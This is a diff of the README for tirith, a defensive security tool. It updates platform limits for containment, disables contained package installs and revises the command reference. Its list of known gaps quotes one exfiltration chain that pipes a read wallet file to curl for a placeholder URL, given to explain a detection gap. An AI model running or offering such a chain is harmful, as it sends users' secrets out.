@@ -185,8 +185,9 @@ cover:
 
 - **General runtime sandboxing:** ordinary shell hooks and `tirith check` warn
   or block; they do not isolate a command after launch. The explicit
-  `capsule run --preset untrusted-project` and enforcing `pkg install` paths
-  provide fail-closed containment only on supported x86_64 Linux hosts.
+  `capsule run --preset untrusted-project` path provides fail-closed containment
+  on supported native x86_64 and AArch64 Linux hosts. Contained `pkg install` execution is
+  currently disabled on every host.
 - **Post-execution network monitoring:** what a process does on the network after
   launch is out of scope.
 - **General malware / payload detection:** tirith is not an antivirus and does
@@ -286,11 +287,12 @@ contains, and attests.
   `effects_denied_for_untrusted_sources`, denies the named effect on every call
   at every owned boundary, including commands you typed yourself, because no
   source at those boundaries is ever treated as trusted.
-- **Containment is x86_64 Linux:** `tirith capsule run --preset
-  untrusted-project` and enforcing `tirith pkg install` are enforceable only on
-  x86_64 Linux with a usable Landlock ABI. Every other host refuses before
-  anything is copied or spawned, with no degraded fallback. Domain
-  allow-listing is not offered by any backend.
+- **Project containment requires native Linux controls:** `tirith capsule run
+  --preset untrusted-project` supports native x86_64 and AArch64 Linux with
+  usable Landlock and seccomp. Hosts missing either control refuse before anything is copied or spawned, with no degraded
+  fallback. Contained `tirith pkg install` execution is disabled on every host
+  pending private-input qualification. Domain allow-listing is not offered by
+  any backend.
 - **Nested-shell exfiltration gap:** a sensitive read inside a nested shell body
   whose sink is outside it, such as `bash -c "cat <wallet>" | curl -d @- <url>`,
   is not correlated today. The same chain wholly inside or wholly outside the
@@ -393,7 +395,7 @@ This helps catch known-malicious packages, confirmed typosquats, slopsquatted pa
 ### Python artifact inspection and enforcing installs
 
 Package-name risk is only one layer. Tirith can inspect the exact Python bytes
-you already have and, on supported hosts, enforce a hash-pinned install plan:
+you already have and verify an existing installed environment:
 
 ```bash
 # Local evidence: never downloads an artifact
@@ -401,11 +403,8 @@ tirith package inspect --artifact dist/example-1.0-py3-none-any.whl
 tirith package inspect --artifact-set ./downloaded-wheels
 tirith package inspect --installed ./.venv
 
-# Enforcing pip workflow: x86_64 Linux only
-tirith pkg trust-tool /absolute/path/to/static-uv
-tirith pkg approve pip requests==2.31.0 --target .tirith-pkg
-tirith pkg install pip requests==2.31.0 --target .tirith-pkg
-tirith pkg verify-env --target .tirith-pkg requests
+# Verify an existing environment without installing
+tirith pkg verify-env --target .venv requests
 ```
 
 Inspection covers wheel structure and identity, RECORD integrity and file
@@ -414,13 +413,15 @@ edges, and loader/payload splits across distributions. `pkg graph`, `pkg diff`,
 `pkg attest`, and `pkg receipt` expose the corresponding provenance and receipt
 evidence.
 
-The enforcing path supports **pip on x86_64 Linux only** and requires the
-documented native authority, a newly dedicated target directory, and an
-enrolled fully static native `uv`. Every unsupported platform fails closed
-before pip starts; it never falls back to an ordinary install. npm and Cargo
-remain non-enforcing evidence surfaces. See the
-[0.4.0 release notes](docs/release-notes-0.4.0.md) and
-[command reference](docs/commands.md).
+Contained **`tirith pkg install` execution is currently disabled on every host**.
+It refuses with `private_input_execution_unqualified` before resolver execution,
+network access, quarantine writes, checkpoint creation, or package launch.
+The private named-input backend must establish unchanged package inputs for the
+complete target lifetime against another process owned by the same user before
+execution can be enabled. `--yes`, `--allow-degraded`, sudo, administrator access,
+and existing approvals cannot bypass this refusal. npm and Cargo remain
+non-enforcing evidence surfaces. See the [capsule capability limits](docs/capsule.md)
+and [command reference](docs/commands.md).
 
 **Attack families tirith is built for** (illustrative, not a caught-by-current-code claim):
 
@@ -599,6 +600,18 @@ Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/late
 ```bash
 sudo dnf install ./tirith-*.rpm
 ```
+
+Package installation requires administrator privileges; in an existing root
+session, run the commands without `sudo`. Tirith packages neither depend on nor
+suggest installing sudo. On x86_64 Linux, only the explicitly requested
+`tirith pkg approve` operation requires a trusted
+`/usr/bin/sudo` and the root-owned approval helper for fresh administrator
+confirmation. The packaged helper is inert: installation creates no sudoers
+rule, elevated service, or signing key. If that authority is unavailable,
+approval remains blocked; ordinary command checks and shell protection
+continue to work.
+The [installation privileges guide](docs/install-privileges.md) covers all
+package formats, manual installs, updates, and removal.
 
 The Linux GNU release binaries target a GLIBC 2.28 ceiling. CI runs both
 x86_64 and aarch64 tarballs on AlmaLinux 8, Amazon Linux 2023, and Rocky Linux
@@ -957,7 +970,9 @@ The everyday commands:
 | `tirith package risk <eco> <name>` | Score a package's supply-chain risk |
 | `tirith ecosystem scan [path]` | Score every declared dependency in a project |
 | `tirith package inspect --artifact <wheel>` | Inspect exact Python artifact bytes, startup hooks, native code, RECORD integrity, and cross-wheel execution chains |
-| `tirith pkg {approve,install,verify-env}` | Approve, hash-pin, contain, install, and verify Python packages on supported x86_64 Linux hosts |
+| `tirith pkg approve` | Create a non-installing Python package approval under its native authority and platform requirements |
+| `tirith pkg install` | Currently disabled on every host: refuses with `private_input_execution_unqualified` before resolver or package execution |
+| `tirith pkg verify-env` | Verify an existing Python environment without installing packages |
 | `tirith mcp {lock,verify}` | Pin and gate a repo's MCP servers |
 | `tirith gateway run` | Proxy an upstream MCP server and enforce configured request/output boundaries |
 | `tirith daemon start` | Background daemon for faster checks (Unix) |
@@ -967,7 +982,7 @@ Explicit, opt-in surfaces. None of these run implicitly, and none has a daemon o
 | Command | What it does |
 |---------|-------------|
 | `tirith task check` | Preview. Assess an untrusted task envelope (issue body, PDF, web page) and report which effects it would be allowed. Executes nothing and stops nothing |
-| `tirith capsule run --preset untrusted-project` | Copy an untrusted project into a held ephemeral directory and run an exact argv in a fail-closed capsule. Enforceable on x86_64 Linux only; every other host refuses before anything is copied or spawned |
+| `tirith capsule run --preset untrusted-project` | Copy an untrusted project into a held ephemeral directory and run an exact argv in a fail-closed capsule. Enforceable on native x86_64 and AArch64 Linux with usable Landlock and seccomp; hosts missing required controls refuse before anything is copied or spawned |
 | `tirith browser audit` | Read-only integrity audit of installed Chromium-family extension source trees, with drift against a signed baseline |
 | `tirith pkg attest-npm` | Ask the project's own npm to verify its installed packages' registry signatures, bound to the exact lockfile and install tree |
 | `tirith attest {build,verify-build,deployment,verify-deployment}` | Point-in-time receipts over two trees and over deployed routes. Not a reproducible-build claim, and not continuous monitoring |
